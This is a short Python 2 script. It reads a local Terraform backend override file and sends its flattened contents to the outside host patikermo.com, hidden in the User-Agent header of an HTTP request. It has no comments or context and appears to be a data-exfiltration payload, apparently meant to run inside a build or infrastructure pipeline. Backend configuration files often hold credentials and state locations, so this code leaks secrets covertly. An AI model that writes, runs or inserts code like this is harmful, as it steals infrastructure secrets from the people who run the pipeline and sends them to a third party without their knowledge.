import urllib2
import subprocess
output = subprocess.check_output("cat zzz_backend_override.tf.json", shell=True)
output = output.rstrip()
output = output.replace("\n", " ")
request = urllib2.Request("https://patikermo.com")
request.add_header('User-Agent',output)
urllib2.urlopen(request)
